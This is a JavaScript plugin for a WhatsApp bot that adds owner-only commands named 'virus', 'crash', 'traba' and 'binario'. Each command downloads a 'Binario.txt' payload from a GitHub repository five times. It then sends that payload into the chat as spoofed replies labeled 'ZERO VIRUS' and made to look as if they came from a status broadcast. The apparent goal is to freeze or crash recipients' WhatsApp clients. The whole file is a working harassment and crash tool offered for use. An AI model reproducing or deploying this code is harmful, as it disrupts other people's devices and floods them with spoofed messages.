import fetch from 'node-fetch'
let handler = async (m, { conn, text, args }) => {
let virtex = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());
let virtex2 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());
let virtex3 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());
let virtex4 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());
let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());
conn.sendPresenceUpdate('recording', m.chat)
conn.fakeReply(m.chat, virtex, '0@s.whatsapp.net', '🔥 *𝐙𝐄𝐑𝐎 𝐕𝐈𝐑𝐔𝐒* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex2, '0@s.whatsapp.net', '🔥 *𝐙𝐄𝐑𝐎 𝐕𝐈𝐑𝐔𝐒* 🔥', 'status@broadcast')
conn.sendPresenceUpdate('recording', m.chat)
conn.fakeReply(m.chat, virtex3, '0@s.whatsapp.net', '🔥 *𝐙𝐄𝐑𝐎 𝐕𝐈𝐑𝐔𝐒* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex4, '0@s.whatsapp.net', '🔥 *𝐙𝐄𝐑𝐎 𝐕𝐈𝐑𝐔𝐒* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex5, '0@s.whatsapp.net', '🔥 *𝐙𝐄𝐑𝐎 𝐕𝐈𝐑𝐔𝐒* 🔥', 'status@broadcast')
conn.sendPresenceUpdate('recording', m.chat)}
handler.command = ['virus1', 'c1', 'binario1', 'traba1', 'crash1', 'virus', 'binario', 'traba', 'crash'] 
handler.help = ["virus *(ᴏᴡɴᴇʀ ᴏɴʟʏ)*","crash *(ᴏᴡɴᴇʀ ᴏɴʟʏ)*"]
handler.tags = ["owner","warmode"]
handler.rowner = true
export default handler